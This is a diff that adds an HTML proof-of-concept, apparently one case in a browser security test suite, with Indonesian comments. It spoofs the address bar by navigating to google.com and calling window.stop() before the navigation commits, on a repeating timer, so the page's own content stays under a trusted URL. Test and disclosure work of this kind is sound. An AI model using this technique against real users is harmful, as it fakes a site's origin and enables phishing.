@@ -1,0 +1,18 @@
+<!-- 6 | address-bar spoof - HOLD pakai window.stop() | [1-CLICK]
+     GENOME  A=window.stop() (nol jaringan)  B=location=  C=click  D=S1  F=document.write
+     KENAPA INI BEDA  1/2/4/5 butuh port mati. Yang ini TIDAK butuh jaringan sama sekali:
+     navigasi dimulai lalu DIBUNUH sendiri sebelum commit. Artinya ia tetap hidup di lingkungan
+     tanpa akses keluar (WebView, kiosk, jaringan tertutup) - tempat kelas ini masih subur.
+     PREDIKAT  omnibox menulis target, dokumen tetap milik penyerang
+     EXPECTED-SECURE  omnibox jujur kembali begitu navigasi dibatalkan. KONTROL  3.html -->
+<button onclick="go()">Run 6</button>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  document.write('<h2>SPOOFED via window.stop() &mdash; bukan google.com</h2>');
+  location = 'https://www.google.com/';
+  setTimeout(function () { window.stop(); }, 20);
+  setInterval(function () { location = 'https://www.google.com/'; setTimeout(window.stop, 20); }, 3000);
+}
+</script>
